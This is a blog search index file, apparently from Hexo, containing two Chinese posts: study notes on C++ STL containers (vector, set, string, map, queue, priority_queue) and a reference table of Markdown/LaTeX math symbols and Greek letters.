<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C++ STL 学习</title>
      <link href="/2023/11/20/C++%E6%A0%87%E5%87%86%E6%A8%A1%E6%9D%BF%E5%BA%93STL%EF%BC%88%E4%BB%8B%E7%BB%8D%EF%BC%89/"/>
      <url>/2023/11/20/C++%E6%A0%87%E5%87%86%E6%A8%A1%E6%9D%BF%E5%BA%93STL%EF%BC%88%E4%BB%8B%E7%BB%8D%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>由于自己之前并不常用 STL 库，而 STL 库在很多算法中能够节省很多自己手打数据结构的时间，故这里开一个笔记来重新学习一下，也方便自己之后能够复习。</p><h2 id="vector-的常见用法详解"><a class="markdownIt-Anchor" href="#vector-的常见用法详解">#</a> Vector 的常见用法详解</h2><p>【简介】vector 翻译为向量，我觉得用‘变长数组’来解释他更为合适。利用 vector 可以避免超内存等情况，节省空间。也可以用邻接表的方式来存储图。  使用 vector 头文件是  vector 需要 include.<br><strong>1，vector 定义</strong><br>单独定义一个 vector:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p>上面这个定义其实相当于定义了一个一维数组 name [SIZE]，只不过其长度可以根据需要进行变化。 这里的 typename 可以是任何数据类型。<br>如果 typename 也是 vector</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="keyword">typename</span>&gt;&gt; name; </span><br></pre></td></tr></table></figure><p>这里很容易联想到二维数组的定义，我们可以认为其是两个维度都可变长的二维数组。<br>然后是<strong> vector 数组</strong> 的方法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="keyword">typename</span>&gt; Arrayname[arraysize];</span><br></pre></td></tr></table></figure><p>这样 Arrayname [0] ~ Arrayname [arraysize-1] 都是一个<strong> vector</strong> 容器。 这里是一个维度固定的二维数组。<br><strong>2，vector 容器内元素的访问</strong></p><ul><li><p>通过下标访问。<br>和访问普通数组一样，对于 vector&lt;typename&gt; vi; 直接通过 vi [index 访问即可。这里的下标是从 0 到 vi.size ()-1 访问这个范围外的元素可能会出错。</p></li><li><p>通过迭代器访问。<br>迭代器 (iterator) 可以理解是一种类似<strong>指针</strong>的东西，其定义是:</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="keyword">typename</span>&gt;::iterator it;</span><br></pre></td></tr></table></figure><p>这样得到了迭代器 it, 并且可以通过 * it 来访问 vector 的元素。<br>例如，这里有一个 vector 容器：</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; v1;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= <span class="number">5</span>; i++)&#123;</span><br><span class="line"> vi.<span class="built_in">push_back</span>(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过下面的方式进行访问容器内的元素</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt;::iterator it = vi.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,*(it + i)); <span class="comment">//输出 vi[i]</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>从这里可以看出 vi [i] 和 *(vi.begin ()+ i ) 是等价的。<br>这里 begin () 是取 vector 头元素的地址，这里引出 <strong>end()</strong> 这里需要注意 <strong>end()</strong> 是取 vector 末尾元素地址的下一个地址，不存储任何元素。故这里有了另一种遍历 vector 的方法。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(vector&lt;<span class="type">int</span>&gt;::iterator it = vi.<span class="built_in">begin</span>(); it != vi.<span class="built_in">end</span>() ; it++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *it);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后需要指出，在常用的 STL 容器中，只有<strong> vector 和 string</strong> 中，才允许使用<strong> vi.begin ()+3</strong> 这种迭代器加上整数的写法。<br><strong>3，vector 常用函数实例解析</strong><br><strong>（1）push_back</strong><br> 顾名思义，push_back (x) 就是在 vector 尾元素添加一个元素 x, 时间复杂度 O (1)。<br><strong>（2）pop_back</strong><br> 即删除 vector 的尾元素。<br><strong>（3）size()</strong><br> 用来获取 vector 中元素的个数。返回 unsigned 类型。<br><strong>（4）clear()</strong><br> 用来清空 vector 中的所有元素。<br><strong>（5）insert()</strong><br> insert (it,x) 用来向 vector 的任意迭代器 it 处插入一个元素 x。<br><strong>（6）erase()</strong><br> 两种用法：删除单个元素，删除一个区间的所有元素。<br>①删除单个元素。 erase (it) 即删除迭代器为 it 处的元素。<br>②删除一个区间所有的元素，erase (first,end), 删除 [first,last) 内的所有元素。<br><strong>4，vector 的常见用途</strong><br>（1）存储数据<br>（2）用邻接表存储图</p></li></ul><h2 id="set-的常见用法详解"><a class="markdownIt-Anchor" href="#set-的常见用法详解">#</a> set 的常见用法详解</h2><p>【简介】set 翻译为集合，是指一个内部自动有序且不含重复元素的容器。考试中，有可能出现需要去掉重复元素的情况，这时候就可以用 set 来保留元素本身不考虑其个数。使用 set 需要添加 &lt;set&gt;。<br><strong>1，set 的定义</strong><br>单独定义一个 set</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p>这里的写法和 vector 基本一样，或者说大部分的 STL 都是这样定义的，typename 可以是任何基本类型。 这里不再介绍各个数组之类的定义方式，和 vector 基本一样。<br><strong>2，set 容器内元素的访问</strong><br> set 只能通过迭代器 (iterator) 访问。定义方式和 vector 的迭代器定义方式一样。由于除了 <strong>vector 和 stirng</strong> 之外的迭代器都不只除 *(it + i) 的访问方式，因此只能按照下面方式枚举。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">\<span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">\<span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">set&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">3</span>);</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">5</span>);</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">2</span>);</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">for</span>(set&lt;<span class="type">int</span>&gt;::iterator it = st.<span class="built_in">begin</span>();it != st.<span class="built_in">end</span>(); it++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *it );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的输出结果为 2  3  5。<br><strong>3,set 常用函数实例解析</strong><br><strong>（1） insert ()</strong><br> insert (x) 可将 x 插入 set 容器中，并自动递增排序和去重。<br><strong>（2）find()</strong><br> find (value) 返回 set 中对应值为 value 的迭代器。<br><strong>（3）erase()</strong><br> erase 也有两种用法：删除单个元素，删除区间内元素<br>①删除单个，st.erase (it)，it 为所要删除元素的迭代器。可以结合 find () 函数来表示<br> st.erase (value),value 为所要删除的元素的值。<br>②删除一个区间的所有元素。 st.erase (first,last) 可以删除一个区间所有的元素，first 和 last 为迭代器形式，注意删除为 [first,last) 左闭右开。<br><strong>（4）size()</strong><br> 用来获得 set 内元素的个数。<br><strong>（5）clear()</strong><br> clear () 用来清空 set 中所有的元素。<br><strong>3,set 的常见用途</strong><br>主要作用是自动去重并按照升序进行排序。</p><h2 id="string的常见用法详解"><a class="markdownIt-Anchor" href="#string的常见用法详解">#</a> string 的常见用法详解</h2><p>【简介】在 C 语言中，一般用字符串数组 char str [] 来存放字符串。使用 string 会更加的方便。如果要使用 string，需要包含 string 头文件，注意 string.h 和 string 是不一样的头文件。<br><strong>1，string 的定义</strong><br>定义 string 的方式和基本数据类型相同，只需要在 string 上跟上变量名（可进行初始化）即可：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">string str = <span class="string">&quot;abcd&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>2，string 中内容的访问</strong><br><strong>（1）通过下标访问</strong><br>一般来说，可以直接像字符数组那样去访问 string:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i &lt; str.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>,str[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果就是 abcd 。<br>如果要读入或者输出整个字符串，则只能用 cin 和 cout：(如果想用 printf 输出 string，需要利用 c_str () 函数将 string 类型转换为字符数组来进行输出)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">cin&gt;&gt;str;</span><br><span class="line">cout&lt;&lt;str;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,str.<span class="built_in">c_str</span>());</span><br></pre></td></tr></table></figure><p><strong>（2）通过迭代器访问</strong><br>因为有些函数如 insert () 和 erase () 要求迭代器为参数，因此还是需要学习一个 string 迭代器的用法。<br>由于 string 不像其他 STL 容器需要参数，故可以这样定义迭代器。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string::iterator it;</span><br></pre></td></tr></table></figure><p>这样就得到了迭代器 it，并且可以通过 * 来访问 string 的每一位。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;abcd&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(string::iterator it = str.<span class="built_in">begin</span>(); it != str.<span class="built_in">end</span>(); it++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, *it);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3,string 常用函数实例解析</strong><br> string 的函数有很多，这里只调出几个主要的。<br><strong>（1）operator+=</strong><br> 这是 string 的加法，可以直接将两个 string 拼接起来。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str1 = <span class="string">&quot;abc&quot;</span>, str2 = <span class="string">&quot;xyz&quot;</span>;</span><br><span class="line">str1 += str2; <span class="comment">//将str2直接拼接到str1上</span></span><br></pre></td></tr></table></figure><p><strong>（2）compare operator</strong><br> 两个 string 类型可以用 ==，!= , &lt;, &lt;= ,&gt; , &gt;= 进行比较大小，比较规则是字典序。<br><strong>（3）length()/size()</strong><br> length () 返回 stirng 的长度，即存放的字符数。size () 和 length () 基本相同。<br><strong>（4） insert()</strong><br> string 的 insert () 函数有很多写法，这里给出几个常用的写法。<br>①insert (pos,string)，在 pos 号位置中插入字符串 string。<br>②insert (it,it2,it3)，it 为字符串的欲插入位置，it2 和 it3 为待插入字符串的首尾迭代器，用来表示串 [it2,it3) 将被插入在 it 的位置上。<br><strong>（5）erase()</strong><br> erase () 有两种用法：删除单个元素，删除一个区间的所有元素。<br>①删除单个元素：erase (it) 用于删除单个元素，it 为所需要删除的元素的迭代器。<br>②删除一个区间所有元素，erase (first,last)，同理，删除 [first,last)，first 和 last 为相应的迭代器。这里还有一种用法，str.erase (pos,length)，pos 为需要开始删除的起始位置，length 为删除的字符个数。<br><strong>（6）clear()</strong><br> clear () 用于清空 string 的数据。<br><strong>（7）substr()</strong><br> substr (pos,len) 返回从 pos 号位开始，长度为 len 的字串<br><strong>（8）string::npos</strong><br>string::npos 是一个常数，其本身的值为 - 1，但是由于是 unsigned_int 类型，因此实际上也可以认为其是 unsigned_int 类型最大值，string::npos 用以作为 find 函数匹配失败的返回值。<br><strong>（9）find()</strong><br> str.find (str2)，当 str2 是 str 的子串时，返回其在 str 中第一次出现的位置，如果 str2 不是 str 的子串，返回 string::npos。<br>str.find (str2,pos)，从 str 的 pos 号位开始匹配 str2，返回值和上相同。<br><strong>（10）replace()</strong><br> str.replace (pos,len,str2) 把 str 从 pos 号位开始，长度为 len 的子串替换为 str2。<br>str.replace (it1,it2,str2) 把 str 的迭代器 [it1,it2) 范围的子串替换为 str2。</p><h2 id="map的常用用法详解"><a class="markdownIt-Anchor" href="#map的常用用法详解">#</a> map 的常用用法详解</h2><p>【简介】 map 翻译为映射。在定义数组时 (int array [100])，其实是定义了一个从 int 型到 int 型的映射，比如 array [0] = 25,array [4] =36 就分别是将 0 映射到 25，将 4 映射到 36. 一个 double 型数组则是将 int 映射到 double 型，这里不再介绍。这样，当我们需要其他类型作为关键字来作映射，会显得不太方便。这时可以用到 map，因为 map 可以将任何基本类型（包括 STL 的容器）映射到任意基本类型。<br><strong>1，map 的定义</strong><br>单独定义一个 map</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">map&lt;typename1,typename2&gt; mp;</span><br><span class="line">map&lt;string,<span class="type">int</span>&gt; map;  <span class="comment">//字符串映射int型 必须用string</span></span><br><span class="line">map&lt;set&lt;<span class="type">int</span>&gt;,string&gt; mp;  <span class="comment">//可以让STL容器作为键</span></span><br></pre></td></tr></table></figure><p>上述代码中，第一个是键的类型，第二个是值得类型。注意如果是字符串到整型得映射，必须用 string 而不能用 char 数组。<br><strong>2，map 容器内元素得访问</strong><br> map 有两种访问方式：下标和迭代器</p><ul><li>通过下标访问<br>和普通数组一样，例如对于 map&lt;char,int&gt; mp 得 map 来说，可以使用 mp [‘c’] 来访问对应对应得整数。当建立映射时，可以用 mp [‘c’] = 20 这样和普通数组一样得方式。但是要注意的是，<strong>map 中得键是唯一的</strong>。</li><li>通过迭代器访问<br> map 得迭代器定义和其他得 STL 容器迭代器定义得方式一样  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map&lt;typename1,typename2&gt;::iterator it;</span><br></pre></td></tr></table></figure>typename1 和 typename2 就是定义 map 时填写得类型，这样就得到了迭代器 it。<br>map 迭代器得使用方式和其他 STL 容器得迭代器不同，因为 map 得每一对映射都有两个 typename，这决定了必须能通过一个 it 来同时访问键和值。事实上，<strong>map 可以使用 it-&gt;first 来访问键，使用 it-&gt;second 来访问值。</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; mp;</span><br><span class="line">mp[<span class="string">&#x27;m&#x27;</span>] = <span class="number">20</span>;</span><br><span class="line">mp[<span class="string">&#x27;r&#x27;</span>] = <span class="number">30</span>;</span><br><span class="line">mp[<span class="string">&#x27;a&#x27;</span>] = <span class="number">40</span>;</span><br><span class="line"><span class="keyword">for</span>(map&lt;<span class="type">char</span>,<span class="type">int</span>&gt;::iterator it = mp.<span class="built_in">begin</span>(); it != mp.<span class="built_in">end</span>(); it++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c %d\n&quot;</span>, it-&gt;first, it-&gt;second);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>结果：  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a <span class="number">40</span></span><br><span class="line">m <span class="number">20</span></span><br><span class="line">r <span class="number">30</span></span><br></pre></td></tr></table></figure>这里似乎有一个很神奇的现象：<strong>map 会以键从小到大的顺序自动排序</strong>，这是由于 map 内部使用红黑树实现的 (set 也是)，在建立映射会自动实现从小到大的排序功能。<br><strong>3，map 常用函数实例解析</strong><br><strong>（1）find ()</strong><br> find (key) 返回键为 key 的映射的迭代器。<br><strong>（2）erase()</strong><br> 有两种用法：删除单个元素，删除一个区间额你的所有元素。<br>①删除单个元素：map.erase (it)，it 为需要删除的元素的迭代器。<br>示例如下:</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; mp;</span><br><span class="line">mp[<span class="string">&#x27;a&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">mp[<span class="string">&#x27;b&#x27;</span>] = <span class="number">2</span>;</span><br><span class="line">mp[<span class="string">&#x27;c&#x27;</span>] = <span class="number">3</span>;  </span><br><span class="line">map&lt;<span class="type">char</span>,<span class="type">int</span>&gt;::iterator it = mp.<span class="built_in">find</span>(<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">mp.<span class="built_in">erase</span>(it);  <span class="comment">//这里删除了 b 2</span></span><br></pre></td></tr></table></figure><p>第二种方式，mp.erase (key),key 为欲删除的映射的键。<br>②删除一个区间的所有元素。mp.erase (first,last)，其中 first 为需要删除的区间的起始迭代器，而 last 则为需要删除的区间的末尾迭代器的一个地址，也为左闭右开的区间 [first,last)。<br><strong>（3）size()</strong><br> size () 用来获取 map 中映射的对数。<br><strong>（4）clear()</strong><br> clear () 用来清空 map 中的所有元素。<br><strong>4,map 的常见用途</strong><br>感觉 map 能用到的地方应该算是比较多的。</p><ul><li>需要建立字符和整数之间映射的题目。</li><li>判断大整数或其他数据是否存在的题目，吧 map 当 bool 数组使用。</li><li>字符串和字符串的映射也可能会遇到。<br>** 扩展:mao 的键和值是唯一的，如果一个键需要对应多个值，只能用 multimap。另外，C++11 还加了 unordered_map，以散列代替 map 内部的红黑树实现，使其可以用来处理只映射而不按 key 排序的需求，速度会很快。</li></ul><h2 id="queue的常见用法详解"><a class="markdownIt-Anchor" href="#queue的常见用法详解">#</a> queue 的常见用法详解</h2><p>【定义】queue 翻译为队列，是一种很常见的数据结构。STL 实现了一个先进先出的容器。使用时需要添加 queue 的头文件。<br><strong>1，queue 的定义</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">queue&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p><strong>2，queue 容器内元素的访问</strong><br>由于队列本身是一种先进先出的限制性数据结构，因此再 STL 中只能用 front () 来访问队首元素，或者是 back () 来访问队尾元素。<br><strong>3，queue 常用函数实例解析</strong><br><strong>（1）push ()</strong><br> push (x) 将 x 进行入队。<br><strong>（2）front(),back()</strong><br> front 和 back 分别获取队首元素和队尾元素。<br><strong>（3）pop()</strong><br> pop () 令队首元素出队。<br><strong>（4）empty()</strong><br> empty () 检测 queue 是否为空。<br><strong>（5）size()</strong><br> size () 返回 queue 内元素的个数。<br><strong>4,queue 的常见用途</strong><br>当需要进行 BFS 时，可以直接用 queue 进行代替<br>有一点可能需要注意，再使用 front () 和 back () 之前，先用 empty () 判断队列是否为空，否则可能会出现错误。</p><h2 id="priority_queue的常见用法详解"><a class="markdownIt-Anchor" href="#priority_queue的常见用法详解">#</a> priority_queue 的常见用法详解</h2><p>【简介】 priority_queue 又称为优先队列，其底层是用堆来实现的。在优先队列中，队首元素一定是当前队列中优先级最高的哪一个。如队列有如下元素，且定义好了优先级：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">桃子 (优先级<span class="number">3</span>)</span><br><span class="line">梨子 (优先级<span class="number">4</span>)</span><br><span class="line">苹果 (优先级<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>那么出队顺序为梨子 -&gt; 桃子 -&gt; 苹果。<br>当然，可以在任何时候往优先队列加入元素，而优先队列底层的数据结构堆 (heap) 会随时调整结构，使得每次的队首元素都是优先级最大的。<br><strong>1，priority_queue</strong><br> 要使用优先队列，应该添加头文件 queue。 其定义写法也和其他 STL 容器相同。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">priority_queue&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p><strong>2,priority_queue 容器内元素的访问</strong><br>和队列不一样的是，优先对立而没有了 front () 和 back () 函数，而只能通过 top () 函数来访问队首元素，也就是优先级最高的元素。<br><strong>3,priority_queue 常用函数实例解析</strong><br><strong>（1）push ()</strong><br> push (X) 将 X 入队，时间复杂度 O (logN)，其中 N 为当前优先队列中的元素个数。<br><strong>（2）top()</strong><br> 获取队首（堆顶）的元素。<br><strong>（3）pop()</strong><br> 使队首（堆顶）的元素出队。<br><strong>（4）empty()</strong><br> 检测优先队列是否为空。<br><strong>（5）size()</strong><br> size () 返回优先队列元素的个数。<br><strong>4，priority_queue 内元素优先级的设置</strong><br>下面来介绍下优先级的设置方法。<br><strong>（1）基本数据类型的优先级设置</strong><br>此处指的是 int,double,char 等可以直接使用的数据类型，对他们的游戏那寄设置一般使数字大的优先级越高，因此队首元素就是优先队列元素中最大的那个 (char 类型则是字典序最大的)。对基本数据类型来说，下面两种定义是<strong>等价的</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">priority_queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">priority_queue&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt;,less&lt;<span class="type">int</span>&gt;&gt; q;</span><br></pre></td></tr></table></figure><p>可以发现，第二种定义方式的尖括号多出了两个参数：一个是 vector&lt;int&gt;，另一个是 less&lt;int&gt;。其中第二个参数填写的是承载底层数据结构堆的容器，如果第一个参数是 double 或 char 型，则此处只需要填写 vector&lt;double &gt; 或 vector&lt;char&gt;; 而第三个参数 less&lt;int &gt; 则是对第一个参数的比较类，less&lt;int &gt; 表示数字大的优先级大，而 greater&lt;int &gt; 表示数字小的优先级大。<br><strong>（2）结构体的优先级设置</strong><br>这里以开头举得水果的例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">fruit</span>&#123;</span><br><span class="line">string name;</span><br><span class="line"><span class="type">int</span> price;</span><br><span class="line"><span class="keyword">friend</span> <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> fruit &amp;f1,<span class="type">const</span> fruit &amp;f2)&#123;</span><br><span class="line"><span class="keyword">return</span> f1.price &lt; f2.price;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">priority_queue&lt;fruit&gt; q;   <span class="comment">//这里就像sort的cmp函数一样， 这里是正常的</span></span><br></pre></td></tr></table></figure><p>现在如果希望水果的价格高作为优先级高，就需要<strong>重载</strong>小于号 &quot;&lt;&quot;。重载是指对已有的运算符重新定义。见上代码块。可以看到在结构体增加了一个友元函数。 这里可以记一下， <strong>优先对了的这个函数和 sort 的 cmp 函数的效果是相反的。</strong><br><strong>5,priority_qeue 的常见用途</strong><br>可以解决一些贪心问题，也可以对 Dijkstra 算法进行优化。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MarkDown语法</title>
      <link href="/2023/11/19/MarkDown%E8%AF%AD%E6%B3%95/"/>
      <url>/2023/11/19/MarkDown%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>发现自己 MarkDown 的好多语法还要上网上搜索，那干脆自己记录一下吧。</p><table><thead><tr><th>符号</th><th>Markdown</th><th>名称</th></tr></thead><tbody><tr><td>∅</td><td><code>\emptyset</code></td><td>空集</td></tr><tr><td>∈</td><td><code>\in</code></td><td>属于</td></tr><tr><td>∋</td><td><code>\ni</code></td><td></td></tr><tr><td>∉</td><td><code>\notin</code></td><td>不属于</td></tr><tr><td>⊂</td><td><code>\subset</code></td><td>子集</td></tr><tr><td>⊃</td><td><code>\supset</code></td><td></td></tr><tr><td>⊄</td><td><code>\not\subset</code></td><td>非子集</td></tr><tr><td>⊆</td><td><code>\subseteq</code></td><td>真子集</td></tr><tr><td>⊇</td><td><code>\supseteq</code></td><td></td></tr><tr><td>∪</td><td><code>\cup</code></td><td>并集</td></tr><tr><td>⋃</td><td><code>\bigcup</code></td><td>并集</td></tr><tr><td>∩</td><td><code>\cap</code></td><td>交集</td></tr><tr><td>⋂</td><td><code>\bigcap</code></td><td>交集</td></tr><tr><td>∨</td><td><code>\vee</code></td><td>或者</td></tr><tr><td>∧</td><td><code>\wedge</code></td><td>并且</td></tr><tr><td>∖</td><td><code>\setminus</code></td><td>集合的减法</td></tr><tr><td n="">\prod_{i=1}^</td><td>$\prod_<ruby>i=1}<rp>【</rp><rt>{n</rt><rp>】</rp></ruby>$</td><td>连乘</td></tr></tbody></table><table><thead><tr><th>字母</th><th>实现</th><th>字母</th><th>实现</th><th>字母</th><th>实现</th></tr></thead><tbody><tr><td>A</td><td><code>A</code></td><td>α</td><td><code>\alpha</code></td><td>Θ</td><td><code>\Theta</code></td></tr><tr><td>B</td><td><code>B</code></td><td>β</td><td><code>\beta</code></td><td>ι</td><td><code>\iota</code></td></tr><tr><td>Γ</td><td><code>\Gamma</code></td><td>γ</td><td><code>\gamma</code></td><td>K</td><td><code>K</code></td></tr><tr><td>Δ</td><td><code>\Delta</code></td><td>δ</td><td><code>\delta</code></td><td>κ</td><td><code>\kappa</code></td></tr><tr><td>E</td><td><code>E</code></td><td>ϵ</td><td><code>\epsilon</code></td><td>Λ</td><td><code>\Lambda</code></td></tr><tr><td>Z</td><td><code>Z</code></td><td>ζ</td><td><code>\zeta</code></td><td>λ</td><td><code>\lambda</code></td></tr><tr><td>H</td><td><code>H</code></td><td>η</td><td><code>\eta</code></td><td>M</td><td><code>M</code></td></tr><tr><td>Θ</td><td><code>\Theta</code></td><td>θ</td><td><code>\theta</code></td><td>μ</td><td><code>\mu</code></td></tr><tr><td>I</td><td><code>I</code></td><td>ι</td><td><code>\iota</code></td><td>N</td><td><code>N</code></td></tr><tr><td>Ξ</td><td><code>\Xi</code></td><td>ξ</td><td><code>\xi</code></td><td>ν</td><td><code>\nu</code></td></tr><tr><td>O</td><td><code>O</code></td><td>ο</td><td><code>\omicron</code></td><td>Π</td><td><code>\Pi</code></td></tr><tr><td>P</td><td><code>P</code></td><td>ρ</td><td><code>\rho</code></td><td>Σ</td><td><code>\Sigma</code></td></tr><tr><td>T</td><td><code>T</code></td><td>σ</td><td><code>\sigma</code></td><td>Υ</td><td><code>\Upsilon</code></td></tr><tr><td>Φ</td><td><code>\Phi</code></td><td>ϕ</td><td><code>\phi</code></td><td>X</td><td><code>X</code></td></tr><tr><td>χ</td><td><code>\chi</code></td><td>Ψ</td><td><code>\Psi</code></td><td>ψ</td><td><code>\psi</code></td></tr><tr><td>Ω</td><td><code>\Omega</code></td><td>ω</td><td><code>\omega</code></td><td>ε</td><td><code>\varepsilon</code></td></tr><tr><td>ϑ</td><td><code>\vartheta</code></td><td>ϖ</td><td><code>\varpi</code></td><td>ϱ</td><td><code>\varrho</code></td></tr><tr><td>ς</td><td><code>\varsigma</code></td><td>φ</td><td colspan="2"><code>\varphi</code></td><td>`</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
